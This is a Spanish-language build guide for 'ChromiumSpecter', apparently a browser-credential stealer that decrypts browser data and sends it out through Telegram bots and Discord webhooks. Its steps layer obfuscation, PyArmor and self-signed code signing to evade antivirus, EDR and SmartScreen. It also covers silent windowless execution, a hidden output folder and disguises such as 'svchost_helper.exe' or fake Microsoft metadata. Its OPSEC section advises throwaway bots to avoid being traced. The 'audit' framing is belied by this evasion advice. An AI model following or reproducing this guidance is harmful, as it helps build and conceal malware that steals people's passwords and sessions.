# 🛡️ Guía Maestra de Ofuscación Híbrida

> [!NOTE]
> [English Version](OBFUSCATION_GUIDE.en.md) | **Versión en Español**

Esta guía detalla el flujo de trabajo profesional para proteger la suite **ChromiumSpecter** contra ingeniería inversa, análisis estático y detecciones heurísticas de antivirus (AV/EDR).

---

## 🏗️ La Arquitectura de Cuatro Capas

Para lograr un binario con máxima resistencia, aplicamos cuatro niveles de protección progresivos y acumulativos:

### 🛡️ Nivel 1: Ofuscación de Datos (Base64)

* **Objetivo**: Evitar que tokens de Telegram/Discord aparezcan como texto plano en el binario. Herramientas como `strings.exe`, `binwalk` o `Detect-It-Easy` los detectarían inmediatamente.
* **Qué protege**: Las cadenas de configuración (tokens, webhooks, IDs).
* **Limitación**: No protege la lógica del programa, solo los datos estáticos.

### 🛡️ Nivel 2: Ofuscación de Fuente (`ofuscator.py`)

* **Objetivo**: Transformar el código fuente en capas de cifrado metamórfico ejecutadas dinámicamente en memoria via `exec()`, eliminando la legibilidad directa del `.py`.
* **Qué protege**: La lógica de descifrado AES, las rutas de los navegadores, las funciones de exfiltración.
* **Limitación**: El bytecode `.pyc` aún puede descompilarse con `uncompyle6` o `decompile3` si no se aplica el Nivel 3.

### 🛡️ Nivel 3: Blindaje de Bytecode (`PyArmor`)

* **Objetivo**: Cifrar el bytecode de Python con una clave única por build. Aunque alguien extraiga el `.pyc` del bundle, leerá datos cifrados sin la Runtime Library de PyArmor.
* **Qué protege**: La estructura interna del ejecutable contra descompiladores.
* **Limitación**: PyArmor añade la Runtime Library como dependencia. Algunos EDR avanzados conocen su firma.

### 🛡️ Nivel 4: Firma Digital de Código (`autocert.sh`)

* **Objetivo**: Dar apariencia de software legítimo al `.exe`. Muchos AV y SmartScreen reducen su nivel de análisis ante binarios firmados.
* **Qué protege**: Contra detecciones heurísticas basadas en "binario sin firma = sospechoso".
* **Limitación**: Un certificado autofirmado no pasa SmartScreen (muestra "Unknown Publisher"). Para bypass completo se necesita un certificado de CA de confianza.

---

## 🔧 Prerrequisitos e Instalación

Antes de comenzar, instala todas las dependencias necesarias:

```bash
# ── Python (Windows/Linux) ───────────────────────────────────────────
pip install pyarmor pyinstaller pycryptodomex pywin32 requests

# ── Herramientas de firma (Linux/WSL únicamente) ─────────────────────
sudo apt install openssl osslsigncode -y   # Debian/Ubuntu/WSL
# sudo pacman -Sy openssl osslsigncode     # Arch Linux
# brew install openssl osslsigncode        # macOS
```

> [!NOTE]
> `pywin32` solo se instala correctamente en Windows. En Linux es solo para desarrollo — la compilación final siempre debe hacerse en Windows.

---

## 🚀 Flujo de Trabajo Paso a Paso

### Paso 1: Guardar el Original y Configurar Credenciales

> [!IMPORTANT]
> Haz una copia de seguridad de `main.py` antes de ofuscarlo. El proceso es destructivo sobre el archivo fuente.

```bash
# Backup obligatorio antes de ofuscar
copy main.py main.py.bak     # Windows CMD
# cp main.py main.py.bak    # Linux/WSL
```

Luego rellena tus credenciales en Base64 en `main.py`:

```python
HARDCODED_TG_TOKEN   = "MTIzNDU2Nzg5MDpBQkMtREVGM..."  # base64(TOKEN)
HARDCODED_TG_ID      = "OTg3NjU0MzIx"                  # base64(CHAT_ID)
HARDCODED_DS_WEBHOOK = "aHR0cHM6Ly9kaXNjb3JkLmNvbS..."  # base64(WEBHOOK_URL)
```

**Cómo convertir a Base64:**

```bash
# Linux/WSL
echo -n "1234567890:ABCdef..." | base64

# Python (cualquier plataforma)
python -c "import base64; print(base64.b64encode(b'TU_TOKEN_AQUI').decode())"
```

### Paso 2: Generar Capas Metamórficas

> [!WARNING]
> **Limitación conocida de `ofuscator.py`**: El ofuscador elimina todas las líneas que empiezan por `import` del cuerpo del código. Si el archivo tiene un `import` dentro de un bloque `try:`, el bloque queda vacío y produce `SyntaxError` al ejecutar el código ofuscado. `main.py` ya fue diseñado para evitar esto usando `importlib.import_module()` en lugar de `import` indentado.

Ejecuta el ofuscador sobre el archivo fuente:

```bash
python ofuscator.py main.py
```

Verifica que el archivo resultante no contiene cadenas legibles:

```bash
# Linux/WSL — buscar cadenas sospechosas
strings main.py | grep -E "(telegram|discord|http|password|decrypt)"

# Si no devuelve nada relevante, la ofuscación fue exitosa ✅
```

### Paso 3: Compilación Robusta y Ofuscada (.exe)

Para simplificar el proceso y evitar errores de compatibilidad entre versiones de PyArmor, utiliza el script **`build.py`**. Este script detecta automáticamente tu entorno y aplica las mejores prácticas de compilación.

```bash
# Recomendado: Un solo archivo, sin consola, con nombre e icono personalizado
python build.py --name "SysHealth" --icon "icono.ico" --onefile --noconsole

# Para una compilación rápida sin ofuscación (solo PyInstaller)
python build.py --no-obf --name "ChromiumAuditor"
```

> [!TIP]
> El ejecutable resultante estará en la carpeta `dist/` (o la que especifiques con `--dist-dir`).

#### Reducir el tamaño del .exe (opcional)

```bash
# UPX NO viene incluido con PyInstaller — descárgalo desde: https://upx.github.io/
# Extrae el binario y apunta --upx-dir a la carpeta que lo contiene:
pyinstaller --onefile --noconsole --upx-dir /ruta/a/carpeta_upx --name "ChromiumAuditor" main.py
```

### Paso 4: Firma Digital del Ejecutable (Linux / WSL)

> [!IMPORTANT]
> Ejecutar **siempre después** de PyArmor/PyInstaller. Firmar un archivo que luego se modifica invalida la firma y activa alertas adicionales en algunos AV.

```bash
# Copiar el .exe a Linux/WSL y firmar
bash autocert.sh dist/ChromiumAuditor.exe

# Con contraseña PFX personalizada
bash autocert.sh dist/ChromiumAuditor.exe "MiContraseñaSegura"
```

**Verificar la firma del .exe resultante:**

```bash
# Linux/WSL
osslsigncode verify dist/ChromiumAuditor.exe

# Windows PowerShell
Get-AuthenticodeSignature ".\ChromiumAuditor.exe" | Format-List
```

---

## 🔍 Verificación y Testing Post-Build

Antes de desplegar el ejecutable, valida que todo funciona y que el sigilo es efectivo:

### 1. Test funcional básico

```bash
# Ejecutar y esperar (si falla la ruta local, buscar en %APPDATA%\.audit\)
# Nota: La carpeta .audit tiene el atributo "Hidden" (Oculta) por sistema.
ChromiumAuditor.exe --no-wipe -v

# El reporte aparecerá como .audit/audit_report.html (o con timestamp si ya existía)
```

### 2. Análisis estático manual

```bash
# Linux/WSL — buscar cadenas comprometedoras en el .exe
strings ChromiumAuditor.exe | grep -iE "(telegram|discord|token|password|api\.telegram)"
# Si devuelve resultados, el Nivel 1 (Base64) no se aplicó correctamente
```

### 3. VirusTotal / AV offline

> [!CAUTION]
> **No subas el .exe a VirusTotal en pruebas reales** — los hashes se comparten públicamente y el archivo queda indexado permanentemente. Usa alternativas offline:
>
> * `Windows Defender` en modo offline: `MpCmdRun.exe -Scan -ScanType 3 -File ChromiumAuditor.exe`
> * `ClamAV` en Linux: `clamscan ChromiumAuditor.exe`

### 4. Test de ejecución sigilosa

```bash
# Verificar que no aparece ventana negra al ejecutarse desde CMD
start /b ChromiumAuditor.exe
# No debe aparecer ninguna ventana visible
```

---

## 🧯 Troubleshooting Común

| Problema | Causa | Solución |
| :--- | :--- | :--- |
| `ModuleNotFoundError: Cryptodome` al ejecutar el .exe | PyInstaller no empaquetó la librería | Añadir `--collect-all pycryptodomex` |
| `ModuleNotFoundError: win32api` | PyWin32 no se incluyó | Añadir `--hidden-import=win32api --hidden-import=win32con` |
| El .exe se abre y se cierra instantáneamente | Error silencioso — falta el log | Compilar **con** `--console` primero para ver el error exacto |
| PyArmor falla con `RuntimeError` | Versión incompatible o error de PATH | Usar el script **`build.py`** que resuelve esto automáticamente |
| `osslsigncode: command not found` | No instalado | `sudo apt install osslsigncode` en WSL |
| SmartScreen bloquea el .exe | Certificado autofirmado | Clic en "Más información → Ejecutar de todas formas" (esperado con self-signed) |

---

## 📊 Comparativa de Protección

| Método | Protección de Datos | Protección de Lógica | Resistencia Descompiladores | Bypass SmartScreen | Tamaño Aprox. |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **PyInstaller Estándar** | ❌ Baja | ❌ Nula | ❌ Muy Baja | ❌ No | ~15 MB |
| **`ofuscator.py` Solo** | ✅ Media | ✅ Alta | ⚠️ Media | ❌ No | ~15 MB |
| **Híbrida (Niv. 1-3)** | ⭐ Máxima | ⭐ Máxima | ⭐ Máxima | ❌ No | ~18 MB |
| **Híbrida + Firma** | ⭐ Máxima | ⭐ Máxima | ⭐ Máxima | ⚠️ Parcial | ~18 MB |

---

## ⚖️ Recomendaciones de OPSEC (Seguridad Operacional)

* **Backup obligatorio**: Guarda siempre `main.py.bak` antes de ofuscar. El proceso es destructivo.
* **Evadir Heurística**: Si el binario es detectado, compilar **sin** la opción `--noconsole` hace que el proceso parezca una herramienta de administración interna estándar de Windows.
* **Bots de un solo uso**: Nunca uses tus cuentas principales. Crea un bot de Telegram o Webhook de Discord exclusivo para cada auditoría y elimínalo al finalizar para prevenir trazabilidad.
* **Renombrar el `.exe`**: Nombres como "ChromiumAuditor" son sospechosos. Prefiere `SysHealth.exe`, `WinDiag.exe` o `svchost_helper.exe`.
* **Metadatos del PE**: PyInstaller permite inyectar metadatos (Versión, Compañía, Descripción) mediante `.spec`. Un binario con metadatos de "Microsoft Corporation" o "Intel" despierta menos sospechas.
* **Timestamp y Firma**: El `autocert.sh` usa DigiCert TSA para que el timestamp de la firma sea verosímil y no coincida con el tiempo de sistema si este fue alterado.

---
